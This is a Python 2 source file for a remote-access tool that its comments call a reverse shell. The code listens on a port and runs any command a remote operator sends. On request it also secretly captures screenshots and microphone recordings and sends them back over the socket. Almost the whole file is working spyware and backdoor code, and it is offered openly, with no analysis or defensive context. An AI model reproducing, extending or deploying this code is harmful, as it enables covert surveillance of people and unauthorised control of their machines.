import socket
import os
import wx
import sys
from recordVoice import record_to_file

def openReverseShell():
    while True:
        host = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        host.bind((socket.gethostbyname(socket.gethostname()),12345))
        print socket.gethostbyname(socket.gethostname())
        host.listen(1)
        print "waiting for connection\n"

        conn,addr = host.accept()
        print "Connected from: ",addr

        while True:
            somethingDidntWork = True
            data = conn.recv(2048)
            print "Command was issued by parasite: ",data
            if(data == 'exit' or data == 'Exit' or data == 'e' or data == 'E'):
                host.close()
                print "Socket closed by parasite!\n"
                conn.sendall("exited\n")
                host.close()
                break
            if 'cd ' in data:
                try:
                    os.chdir(data.split()[1])
                    print "Changed directory to: ",data.split()[1]
                    somethingDidntWork = False
                    pass
                except:
                    print "Could not find directory!\n"
                    somethingDidntWork = True
                    pass
            if 'rs' == data:
                try:
                    record_to_file('C:/TestRemoteShell/hostRecord.wav')
                    sendRecording('C:/TestRemoteShell/hostRecord.wav', conn)
                    
                    conn.sendall("rs taken")
                    break
                except:
                    conn.sendall("rs failed")
                    break
            if 'ss' == data:
                try:
                    takeScreenshot('C:/TestRemoteShell/screenshot.png')
                    sendScreenShot('C:/TestRemoteShell/screenshot.png', conn)

                    conn.sendall("ss taken")
                    break
                except:
                    conn.sendall("ss failed")
                    break
                break
            data = os.popen(data).read()
            if data == '' and somethingDidntWork:
                conn.sendall("Issued, don't know if worked\n")
                somethingDidntWork = True
            elif somethingDidntWork == False:
                conn.sendall("Success!\n")
                somethingDidntWork = True
            else:
                conn.sendall(data)
        host.close()

def takeScreenshot(path):
    app = wx.App()
    screen = wx.ScreenDC()
    size = screen.GetSize()
    bmp = wx.Bitmap(size[0], size[1])
    mem = wx.MemoryDC(bmp)
    mem.Blit(0, 0, size[0], size[1], screen, 0, 0)
    del mem  # Release bitmap
    bmp.SaveFile(path, wx.BITMAP_TYPE_PNG)

def sendScreenShot(pathToImage, conn):
    myfile = open(pathToImage, 'rb')
    theBytes = myfile.read()
    size = str(len(theBytes))
    try:
        conn.sendall(size)
    except:
        conn.sendall("ERROR")
    if conn.recv(1024) == "SUCCESS":
        conn.sendall(theBytes)
    else:
        conn.sendall("FAILED")
    myfile.close()

def sendRecording(pathToRec, conn):
    myfile = open(pathToRec, 'rb')
    theBytes = myfile.read()
    size = str(len(theBytes))
    try:
        conn.sendall(size)
    except:
        conn.sendall("ERROR")
    if conn.recv(1024) == "SUCCESS":
        conn.sendall(theBytes)
    else:
        conn.sendall("FAILED")
    myfile.close()

def createNewFolder(path):
    if not os.path.exists(path):
        os.makedirs(path)

def main():
    createNewFolder('C:/TestRemoteShell') # Creating a new folder to host Screenshots

    # takeScreenshot('C:/TestRemoteShell/screenshot.png') # Taking the screenshots

    openReverseShell() # Opening the reverse shell
if __name__ == "__main__":
    try:
        main()
    except (KeyboardInterrupt, SystemExit) as e:
        print 'Interrupted\n'
        print '',e
        try:
            sys.exit(0)
        except SystemExit:
            os._exit(0)
    except:
        print 'Was an exception\n'
        try:
            sys.exit(0)
        except SystemExit:
            os._exit(0)
